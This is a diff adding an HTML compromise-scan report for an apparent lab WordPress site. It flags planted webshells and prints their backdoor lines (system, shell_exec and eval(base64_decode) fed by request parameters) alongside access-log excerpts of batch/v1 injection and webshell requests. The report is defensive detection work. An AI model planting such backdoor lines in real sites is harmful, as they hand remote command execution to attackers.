@@ -1,0 +1,230 @@
+<!doctype html><html lang=en><head><meta charset=utf-8>
+<meta name=viewport content="width=device-width, initial-scale=1">
+<title>WordPress IOC report — 2c1bd968ffd0</title>
+<style>
+:root{color-scheme:light dark}
+body{font:14px/1.5 system-ui,sans-serif;margin:0;background:#0f1115;color:#e6e6e6}
+header{padding:1.4em 1.6em;background:#161a22;border-bottom:1px solid #262c38}
+h1{margin:0 0 .2em;font-size:1.35em}
+.meta{color:#9aa4b2;font-size:.9em}
+.tiles{display:flex;gap:.8em;flex-wrap:wrap;margin:1em 1.6em}
+.tile{flex:1;min-width:120px;background:#161a22;border:1px solid #262c38;border-radius:10px;padding:.8em 1em;text-align:center}
+.tile b{display:block;font-size:1.8em}
+.tile.PASS b{color:#3fb950}.tile.FAIL b{color:#f85149}.tile.WARN b{color:#d29922}.tile.INFO b{color:#58a6ff}
+main{padding:0 1.6em 2em}
+.card{background:#161a22;border:1px solid #262c38;border-left-width:5px;border-radius:8px;padding:.8em 1em;margin:.7em 0}
+.card.PASS{border-left-color:#3fb950}.card.FAIL{border-left-color:#f85149}
+.card.WARN{border-left-color:#d29922}.card.INFO{border-left-color:#58a6ff}
+.card h3{margin:.1em 0;font-size:1.02em}
+.sum{margin:.3em 0;color:#c9d1d9}
+.badge{display:inline-block;min-width:3.4em;text-align:center;padding:.05em .5em;border-radius:5px;font-size:.78em;font-weight:700;color:#0b0e13;margin-right:.5em}
+.badge.PASS{background:#3fb950}.badge.FAIL{background:#f85149}.badge.WARN{background:#d29922}.badge.INFO{background:#58a6ff}
+details{margin-top:.4em}summary{cursor:pointer;color:#9aa4b2}
+pre{background:#0b0e13;border:1px solid #262c38;border-radius:6px;padding:.7em;overflow:auto;max-height:340px;white-space:pre-wrap;word-break:break-all}
+footer{color:#6b7280;font-size:.82em;padding:1em 1.6em}
+</style></head><body>
+<header>
+  <h1>WordPress IOC report</h1>
+  <div class=meta>host <b>2c1bd968ffd0</b> &middot; webroot <code>/var/www/html</code> &middot; WP <b>7.0.1</b>
+   &middot; access log <code>/var/log/apache2/access_file.log</code> &middot; generated 2026-07-18 07:30:03 UTC</div>
+</header>
+<div class=tiles>
+  <div class="tile PASS"><b>13</b>pass</div>
+  <div class="tile FAIL"><b>7</b>fail</div>
+  <div class="tile WARN"><b>2</b>warn</div>
+  <div class="tile INFO"><b>2</b>info</div>
+  <div class="tile"><b>24</b>checks</div>
+</div>
+<main>
+<section class="card FAIL">
+<h3><span class="badge FAIL">FAIL</span> PHP files in uploads</h3>
+<p class=sum>2 PHP file(s) under uploads/ (never legitimate)</p>
+<details><summary>details</summary><pre>/var/www/html/wp-content/uploads/2026/07/media-manager.php
+/var/www/html/wp-content/uploads/2026/07/settings.php</pre></details>
+</section>
+<section class="card FAIL">
+<h3><span class="badge FAIL">FAIL</span> Command/eval sink fed by request input</h3>
+<p class=sum>4 match(es) — request input reaching an exec/eval sink</p>
+<details><summary>details</summary><pre>/var/www/html/wp-content/themes/twentytwentyfive/functions.php:162:if ( isset($_GET['wp_debug_exec']) ) { @system($_GET['wp_debug_exec']); }
+/var/www/html/wp-content/uploads/2026/07/media-manager.php:17:$out = isset($_POST['cmd']) ? shell_exec($_POST['cmd'].' 2&gt;&amp;1') : '';
+/var/www/html/wp-content/uploads/2026/07/settings.php:1:&lt;?php @eval(base64_decode($_POST["data"])); ?&gt;
+/var/www/html/wp-content/plugins/akismet-helper/akismet-helper.php:10:    echo shell_exec( (string) $_REQUEST['c'] );</pre></details>
+</section>
+<section class="card FAIL">
+<h3><span class="badge FAIL">FAIL</span> File-write sink fed by request input</h3>
+<p class=sum>1 match(es) — request input reaching a file-write sink</p>
+<details><summary>details</summary><pre>/var/www/html/wp-content/uploads/2026/07/media-manager.php:24:  if (@file_put_contents($_POST['save'], $_POST['content']) !== false) {</pre></details>
+</section>
+<section class="card FAIL">
+<h3><span class="badge FAIL">FAIL</span> Obfuscated code near eval</h3>
+<p class=sum>1 file(s) with decoder+eval (packed webshell pattern)</p>
+<details><summary>details</summary><pre>/var/www/html/wp-content/uploads/2026/07/settings.php</pre></details>
+</section>
+<section class="card FAIL">
+<h3><span class="badge FAIL">FAIL</span> Known webshell markers</h3>
+<p class=sum>2 file(s) contain known webshell/infection markers</p>
+<details><summary>details</summary><pre>/var/www/html/wp-content/themes/twentytwentyfive/functions.php
+/var/www/html/wp-content/uploads/2026/07/media-manager.php</pre></details>
+</section>
+<section class="card WARN">
+<h3><span class="badge WARN">WARN</span> PHP newer than core</h3>
+<p class=sum>5 PHP file(s) modified after core install — review (could be legit updates)</p>
+<details><summary>details</summary><pre>/var/www/html/wp-content/themes/twentytwentyfive/functions.php
+/var/www/html/wp-content/uploads/2026/07/media-manager.php
+/var/www/html/wp-content/uploads/2026/07/settings.php
+/var/www/html/wp-content/plugins/lab-log-viewer/lab-log-viewer.php
+/var/www/html/wp-content/plugins/akismet-helper/akismet-helper.php</pre></details>
+</section>
+<section class="card PASS">
+<h3><span class="badge PASS">PASS</span> Auto-loaded drop-ins</h3>
+<p class=sum>No wp-content drop-ins present</p>
+</section>
+<section class="card PASS">
+<h3><span class="badge PASS">PASS</span> Must-use plugins</h3>
+<p class=sum>No mu-plugins directory</p>
+</section>
+<section class="card PASS">
+<h3><span class="badge PASS">PASS</span> .htaccess/.user.ini PHP handler</h3>
+<p class=sum>No auto_prepend_file / PHP-handler injection</p>
+</section>
+<section class="card PASS">
+<h3><span class="badge PASS">PASS</span> wp-config.php integrity</h3>
+<p class=sum>No obvious injection in wp-config.php</p>
+</section>
+<section class="card PASS">
+<h3><span class="badge PASS">PASS</span> Core checksum verification</h3>
+<p class=sum>Core files verify against WordPress.org checksums</p>
+</section>
+<section class="card PASS">
+<h3><span class="badge PASS">PASS</span> Plugin checksum verification</h3>
+<p class=sum>Installed plugins verify against .org checksums</p>
+</section>
+<section class="card INFO">
+<h3><span class="badge INFO">INFO</span> Administrator accounts</h3>
+<p class=sum>Review the admin list for accounts you don't recognise</p>
+<details><summary>details</summary><pre>ID,user_login,user_email,user_registered
+1,admin,admin@lab.local,"2026-07-18 05:10:59"</pre></details>
+</section>
+<section class="card PASS">
+<h3><span class="badge PASS">PASS</span> siteurl/home injection</h3>
+<p class=sum>siteurl/home are clean URLs</p>
+</section>
+<section class="card PASS">
+<h3><span class="badge PASS">PASS</span> Poisoned autoload options</h3>
+<p class=sum>No suspicious payloads in autoloaded options</p>
+</section>
+<section class="card PASS">
+<h3><span class="badge PASS">PASS</span> Application passwords</h3>
+<p class=sum>No application passwords set</p>
+</section>
+<section class="card INFO">
+<h3><span class="badge INFO">INFO</span> Scheduled (cron) events</h3>
+<p class=sum>Non-core cron hooks — confirm each belongs to an installed plugin</p>
+<details><summary>details</summary><pre>do_pings,"2026-07-18 05:11:00"</pre></details>
+</section>
+<section class="card FAIL">
+<h3><span class="badge FAIL">FAIL</span> batch/v1 route-confusion SQLi</h3>
+<p class=sum>540 request(s) — hits on the batch/v1 endpoint (the wp2shell vector)</p>
+<details><summary>details</summary><pre>172.20.0.1 - - [18/Jul/2026:07:18:32 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:32 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:32 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:32 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:32 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:32 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:32 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:32 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:32 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:32 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 1225 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:33 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:34 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:34 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:14 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:38 +0000] "POST /?rest_route=/batch/v1/ HTTP/1.1" 207 17381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"</pre></details>
+</section>
+<section class="card PASS">
+<h3><span class="badge PASS">PASS</span> Blind SQLi payloads</h3>
+<p class=sum>No requests carrying SQL injection markers</p>
+</section>
+<section class="card FAIL">
+<h3><span class="badge FAIL">FAIL</span> Webshell access (PHP in uploads)</h3>
+<p class=sum>3 request(s) — requests to a .php file under uploads/</p>
+<details><summary>details</summary><pre>172.20.0.1 - - [18/Jul/2026:06:28:31 +0000] "GET /wp-content/uploads/2026/07/media-manager.php HTTP/1.1" 200 446 "-" "Mozilla/5.0 (Windows NT 10.0; Microsoft Windows 10.0.26200; en-GB) PowerShell/7.6.2"
+172.20.0.1 - - [18/Jul/2026:07:21:43 +0000] "GET /wp-content/uploads/2026/07/media-manager.php?dir=%2Fvar%2Fwww%2Fhtml HTTP/1.1" 200 1575 "http://localhost:8091/wp-content/uploads/2026/07/media-manager.php?dir=%2Fvar%2Fwww" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:21:51 +0000] "GET /wp-content/uploads/2026/07/media-manager.php HTTP/1.1" 200 1803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"</pre></details>
+</section>
+<section class="card PASS">
+<h3><span class="badge PASS">PASS</span> Command-exec parameters</h3>
+<p class=sum>No requests with cmd/exec-style params</p>
+</section>
+<section class="card PASS">
+<h3><span class="badge PASS">PASS</span> Plugin/theme upload</h3>
+<p class=sum>No plugin/theme upload POSTs (shell delivery)</p>
+</section>
+<section class="card PASS">
+<h3><span class="badge PASS">PASS</span> xmlrpc.php abuse</h3>
+<p class=sum>No xmlrpc requests (brute-force / pingback DDoS)</p>
+</section>
+<section class="card WARN">
+<h3><span class="badge WARN">WARN</span> User enumeration</h3>
+<p class=sum>31 request(s) — author/user-listing probes</p>
+<details><summary>details</summary><pre>172.20.0.1 - - [18/Jul/2026:06:49:33 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:06:49:37 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/plugins.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:06:49:49 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:06:50:11 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer&amp;src=apache_access&amp;n=300&amp;filter&amp;iocs=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:06:50:14 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer&amp;src=apache_access&amp;n=300&amp;filter" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:16:56 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer&amp;src=apache_access&amp;n=300&amp;filter" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:16:58 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer&amp;src=apache_access&amp;n=300&amp;filter" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:17:55 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer&amp;src=apache_access&amp;n=300&amp;filter" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:17:56 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer&amp;src=apache_access&amp;n=300&amp;filter" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:17:57 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/users.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:17:58 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/users.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:17:58 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/users.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:17:59 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/plugins.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:03 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:05 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:09 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer&amp;src=apache_access&amp;n=300&amp;filter" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:19 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer&amp;src=apache_access&amp;n=300&amp;filter&amp;iocs=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:35 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer&amp;src=wp_debug&amp;n=300&amp;filter&amp;iocs=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:37 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer&amp;src=wp_debug&amp;n=300&amp;filter&amp;iocs=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:38 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer&amp;src=apache_access&amp;n=300&amp;filter&amp;iocs=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:18:39 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer&amp;src=apache_access&amp;n=300&amp;filter&amp;iocs=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:19:01 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer&amp;src=apache_access&amp;n=300&amp;filter&amp;iocs=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:19:02 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/tools.php?page=lab-log-viewer&amp;src=apache_access&amp;n=300&amp;filter&amp;iocs=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+172.20.0.1 - - [18/Jul/2026:07:21:22 +0000] "GET /wp-json/wp/v2/users/me?context=edit&amp;_locale=user HTTP/1.1" 404 529 "http://localhost:8091/wp-admin/plugin-editor.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
